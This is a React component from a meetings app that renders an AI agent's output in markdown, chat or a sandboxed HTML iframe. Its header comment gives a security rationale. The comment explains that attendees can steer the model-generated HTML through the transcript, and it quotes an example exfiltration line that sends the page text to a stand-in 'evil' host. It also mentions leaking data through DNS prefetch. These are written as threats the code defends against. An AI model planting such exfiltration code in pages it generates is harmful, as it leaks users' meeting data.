// One agent's live output panel.
//
// Three render modes, chosen by the agent's `widget_type`:
//   markdown — the note-taker's growing document, via MarkdownRenderer
//   html     — the sketch artist's self-contained widget, in a sandboxed iframe
//   chat     — a message thread the user drives directly
//
// The HTML mode is the one with a security posture worth stating, and it takes
// THREE controls, not one. The document is model-generated from meeting
// transcript — which anyone who speaks in the meeting can influence — so:
//
//   1. It renders inside a `srcDoc` iframe with `sandbox="allow-scripts"` and NO
//      `allow-same-origin`. That pair gives the frame a null origin, so its
//      scripts cannot reach this document, our cookies, or the gateway. It is
//      never injected into this page's DOM by any route.
//   2. That is necessary but NOT sufficient: a null origin blocks READING this
//      page, and does nothing about OUTBOUND requests — `fetch(…)` and
//      `new Image().src = 'https://evil/?d='+document.body.innerText` both work
//      fine from one. So the srcdoc is built by `buildSketchSrcdoc`, which
//      prepends a CSP that denies all egress (`connect-src 'none'`, `img-src`
//      with no `https:`) and pins scripts to the same-origin vendored Mermaid
//      file. The frame needs no network, so it is granted none.
//   3. Nor was the CSP sufficient on its own, because it must grant `script-src
//      'unsafe-inline'` for the Mermaid bootstrap. That let the MODEL's inline
//      script run too, and script can stream the transcript out through
//      `<link rel="dns-prefetch">` lookups that no CSP directive governs. So
//      `buildSketchSrcdoc` also strips the model's scripts, event handlers, and
//      speculative/navigational elements before serializing.
//
// The diagram still renders: Mermaid is driven by OUR bootstrap from the
// declarative `div.mermaid` markup the agent is instructed to emit, so removing
// the model's own JS costs the feature nothing. See ../lib/sketchSrcdoc.ts for
// each directive's rationale and the full vector list.

import { useRef, useState } from 'react'
import { FileText, MessageSquare, Volume2, VolumeX } from 'lucide-react'

import { i18nT } from '../../../i18n/t'
import MarkdownRenderer from '../../../components/MarkdownRenderer'
import { Btn, Card, CardTitle, Input, SendBtn } from '../../../components/ui'
import type { AgentDef } from '../api'
import { buildSketchSrcdoc } from '../lib/sketchSrcdoc'

interface Props {
  agent: AgentDef
  output: string
  listening: boolean
  chatView: boolean
  onToggleListening: () => void
  onToggleChatView: () => void
  onSendMessage: (text: string) => void
}

export default function AgentPanel({
  agent,
  output,
  listening,
  chatView,
  onToggleListening,
  onToggleChatView,
  onSendMessage,
}: Props) {
  const inputRef = useRef<HTMLInputElement>(null)
  const [sent, setSent] = useState<string[]>([])
  const isChatAgent = agent.widget_type === 'chat'
  const showChat = chatView || isChatAgent

  const send = () => {
    const text = inputRef.current?.value.trim()
    if (!text) return
    onSendMessage(text)
    setSent(prev => [...prev, text])
    if (inputRef.current) inputRef.current.value = ''
  }

  const header = (
    <div className="flex items-center justify-between gap-2">
      <CardTitle>{agent.name}</CardTitle>
      <div className="flex items-center gap-1">
        {!isChatAgent && (
          <Btn
            onClick={onToggleChatView}
            aria-label={
              chatView
                ? i18nT('apps.meetings.agentPanel.showOutput')
                : i18nT('apps.meetings.agentPanel.showChat')
            }
            title={
              chatView
                ? i18nT('apps.meetings.agentPanel.showOutput')
                : i18nT('apps.meetings.agentPanel.showChat')
            }
          >
            {chatView ? (
              <FileText className="lucide-inline" />
            ) : (
              <MessageSquare className="lucide-inline" />
            )}
          </Btn>
        )}
        <Btn
          onClick={onToggleListening}
          aria-label={
            listening
              ? i18nT('apps.meetings.agentPanel.mute', { name: agent.name })
              : i18nT('apps.meetings.agentPanel.unmute', { name: agent.name })
          }
          title={
            listening
              ? i18nT('apps.meetings.agentPanel.listeningHint')
              : i18nT('apps.meetings.agentPanel.mutedHint')
          }
        >
          {listening ? (
            <Volume2 className="lucide-inline" />
          ) : (
            <VolumeX className="lucide-inline" />
          )}
        </Btn>
      </div>
    </div>
  )

  if (showChat) {
    return (
      <Card className="col-span-2 flex flex-col gap-2">
        {header}
        <div className="flex-1 min-h-[120px] max-h-[320px] overflow-y-auto flex flex-col gap-2">
          {sent.length === 0 ? (
            <p className="text-[13px] text-muted">
              {i18nT('apps.meetings.agentPanel.chatEmpty', { name: agent.name })}
            </p>
          ) : (
            sent.map((message, index) => (
              <div
                key={`${index}-${message.slice(0, 12)}`}
                className="self-end max-w-[85%] px-3 py-1.5 rounded-2xl rounded-br-sm bg-accent/15 border border-accent/20 text-[13px] text-text break-words"
              >
                {message}
              </div>
            ))
          )}
        </div>
        <div className="flex items-center gap-2 pt-2 border-t border-border">
          <Input
            ref={inputRef}
            type="text"
            className="flex-1"
            placeholder={i18nT('apps.meetings.agentPanel.messagePlaceholder', {
              name: agent.name,
            })}
            aria-label={i18nT('apps.meetings.agentPanel.messagePlaceholder', {
              name: agent.name,
            })}
            onKeyDown={e => {
              if (e.key === 'Enter') send()
            }}
          />
          <SendBtn onClick={send} aria-label={i18nT('apps.meetings.agentPanel.send')}>
            {i18nT('apps.meetings.agentPanel.send')}
          </SendBtn>
        </div>
      </Card>
    )
  }

  if (agent.widget_type === 'html') {
    return (
      <Card className="col-span-2 flex flex-col gap-2">
        {header}
        {output ? (
          <iframe
            title={i18nT('apps.meetings.agentPanel.diagramFrameTitle', { name: agent.name })}
            // buildSketchSrcdoc strips the model's scripts/handlers, then wraps
            // what is left in a CSP that denies all network egress and pins
            // scripts to our vendored same-origin Mermaid.
            // `window.location.origin` is required (not a bare path): the frame is
            // null-origin, so a relative /vendor/... URL would not resolve and the
            // CSP cannot use 'self'. Guarded for a non-browser test/SSR context —
            // '' pins a path-only source that matches nothing, i.e. fails CLOSED.
            srcDoc={buildSketchSrcdoc(
              output,
              typeof window === 'undefined' ? '' : window.location.origin,
            )}
            // Null-origin sandbox: scripts may run inside the frame (OUR Mermaid
            // bootstrap needs to) but WITHOUT same-origin, so nothing in the frame
            // can reach this page, its cookies, or the gateway. This is the HARD
            // boundary; the CSP above is the egress control the sandbox lacks.
            sandbox="allow-scripts"
            className="w-full border border-border rounded-md bg-white"
            style={{ minHeight: 340, height: 340 }}
          />
        ) : (
          <p className="text-[13px] text-muted">
            {i18nT('apps.meetings.agentPanel.awaitingOutput', { name: agent.name })}
          </p>
        )}
      </Card>
    )
  }

  return (
    <Card className="col-span-2 flex flex-col gap-2 max-h-[520px] overflow-y-auto">
      {header}
      {output ? (
        <MarkdownRenderer content={output} />
      ) : (
        <p className="text-[13px] text-muted">
          {i18nT('apps.meetings.agentPanel.awaitingOutput', { name: agent.name })}
        </p>
      )}
    </Card>
  )
}
